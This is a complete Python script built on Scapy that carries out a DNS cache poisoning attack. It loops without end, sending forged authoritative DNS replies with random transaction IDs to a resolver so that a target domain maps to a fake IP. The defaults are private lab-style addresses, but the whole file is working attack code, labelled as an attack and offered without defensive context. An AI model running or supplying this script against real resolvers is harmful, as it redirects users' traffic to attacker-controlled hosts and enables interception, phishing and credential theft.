from scapy.all import *
import random
import time
import os

DNS_TARGET = os.getenv("DNS_TARGET", "victim.local")
RESOLVER_IP = os.getenv("RESOLVER_IP", "10.5.0.53")
FAKE_IP = os.getenv("FAKE_IP", "10.5.0.99")
SLEEP = float(os.getenv("SLEEP", "0.02"))

print("Starting DNS poisoning attack...")
print(f"Target={DNS_TARGET}, Resolver={RESOLVER_IP}, FakeIP={FAKE_IP}")

while True:
    txid = random.randint(0, 65535)
    pkt = IP(dst=RESOLVER_IP) / \
          UDP(sport=53, dport=53) / \
          DNS(
              id=txid,
              qr=1,
              aa=1,
              qd=DNSQR(qname=DNS_TARGET),
              an=DNSRR(rrname=DNS_TARGET, ttl=300, rdata=FAKE_IP)
          )
    send(pkt, verbose=0)
    print(f"[+] Sent forged DNS reply TXID={txid}")
    time.sleep(SLEEP)
